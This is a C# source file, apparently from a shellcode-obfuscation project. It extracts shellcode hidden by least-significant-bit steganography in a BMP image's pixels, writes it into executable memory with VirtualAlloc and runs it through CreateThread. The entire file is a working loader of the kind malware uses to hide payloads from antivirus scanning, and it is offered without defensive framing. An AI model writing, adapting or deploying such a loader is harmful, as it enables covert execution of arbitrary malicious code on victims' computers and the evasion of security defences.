using System;
using System.Drawing;
using System.Threading;
using System.Runtime.InteropServices;

namespace csharp
{
    class Reader
    {
        const int shellcode_len = 2208;
        static byte[] payload_data = new byte[shellcode_len / 8];

        static void Main(string[] args)
        {
            read_image("C:\\Users\\Blackberry\\Desktop\\projects\\yet-another-shellcode-obfuscator\\samples\\helpme_x86.bmp");
            run();
            Thread.Sleep(3000);
        }

        static void read_image(string filename)
        {
            Bitmap bm = new Bitmap(filename);


            int length = shellcode_len;
            int pos = 0;
			
            for (int i = 0; i < bm.Height; i++)
            {
                for (int j = 0; j < bm.Width; j++)
                {
                    Color pixel_color = bm.GetPixel(j, i);

                    byte[] channels = { 
                        pixel_color.R,
                        pixel_color.G,
                        pixel_color.B
                    };

                    foreach (byte channel in channels)
                    {
                        if (length <= 0)
                        {
                            return;
                        }

                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], channel);
                        pos++;
                        length--;
                    }
                }
            }
        }


        static byte get_lsb(byte target, byte source)
        {
            return (byte)((target << 1) | (source & 1));
        }


        static void run() {
            IntPtr ptr = VirtualAlloc((IntPtr)0, shellcode_len / 8, 0x3000, 0x40);
            Marshal.Copy(payload_data, 0, (IntPtr)ptr, shellcode_len / 8);

            CreateThread(0, 0, ptr, (IntPtr)0, 0, 0);
        }

        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            UInt32 dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect
        );


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          UInt32 lpThreadId
          );
    }

}
